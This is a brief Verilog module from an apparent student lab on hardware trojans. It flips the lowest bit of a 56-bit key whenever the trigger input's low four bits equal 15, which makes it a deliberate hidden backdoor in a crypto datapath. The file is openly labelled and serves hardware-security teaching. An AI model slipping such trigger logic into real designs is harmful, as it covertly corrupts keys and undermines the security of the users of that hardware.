// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
//Experiement 4 Part 2
//9/17/21

//The trojan.v file to determine if the trigger condition is met
// it will return the pay load (modified key) or not.
// The trigger condition can be change by changing the value of the condition register value
// The tigger is decmial 15

module  trojan_15(payload, key, trigger);

input	[55:0]	    key;
input	[31:0]	    trigger;
output	[55:0]	    payload;
reg     [3:0]     condition = 4'b1111;

assign payload = (trigger[3:0] == condition[3:0]) ? {key[55:1], ~key[0]} : key[55:0];

endmodule